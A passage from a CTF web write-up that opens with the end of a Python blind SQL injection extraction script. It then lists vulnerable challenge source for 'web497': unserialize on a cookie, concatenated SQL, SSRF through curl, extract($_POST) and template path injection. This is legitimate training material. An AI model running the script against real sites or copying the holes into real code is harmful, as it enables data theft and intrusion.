f<span class="string">&quot;1&#x27; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;nickname&#x27;</span>: f<span class="string">&quot;&#123;random.randint(1,100000)&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = session.<span class="title function_ invoke__">post</span>(url, data=date)</span><br><span class="line">        <span class="comment">#print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;管理员信息修改成功&quot;</span> == r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:34:08</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|or|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,nickname,avatar from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 08:40:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line"><span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>api&#x2F;admin_edit.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span 